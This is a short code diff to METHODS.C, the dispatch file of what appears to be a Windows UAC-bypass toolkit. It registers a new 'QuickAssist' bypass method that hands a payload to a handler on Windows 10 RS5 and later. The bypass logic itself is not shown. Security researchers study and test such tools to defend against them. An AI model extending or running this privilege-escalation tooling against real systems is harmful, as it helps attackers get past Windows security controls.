@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.67
+*  VERSION:     3.68
 *
-*  DATE:        11 Feb 2025
+*  DATE:        07 Mar 2025
 *
 *  UAC bypass dispatch.
 *
@@ -53,6 +53,7 @@ UCM_API(MethodIscsiCpl);
 UCM_API(MethodAtlHijack);
 UCM_API(MethodSspiDatagram);
 UCM_API(MethodRequestTrace);
+UCM_API(MethodQuickAssist);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -69,7 +70,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodVFServerDiagProf,
     UacMethodAtlHijack,
     UacMethodSspiDatagram,
-    UacMethodRequestTrace
+    UacMethodRequestTrace,
+    UacMethodQuickAssist
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -153,7 +155,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodAtlHijack, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSspiDatagram, { NT_WIN7_RTM, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
     { MethodTokenModUIAccess, { NT_WIN10_19H1, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodRequestTrace, { NT_WIN11_24H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodRequestTrace, { NT_WIN11_24H2, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodQuickAssist, { NT_WIN10_REDSTONE5, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -863,6 +866,18 @@ UCM_API(MethodRequestTrace)
 {
 #ifdef _WIN64
     return ucmRequestTraceMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
+#endif
+}
+
+UCM_API(MethodQuickAssist)
+{
+#ifdef _WIN64
+    return ucmQuickAssistMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 #else
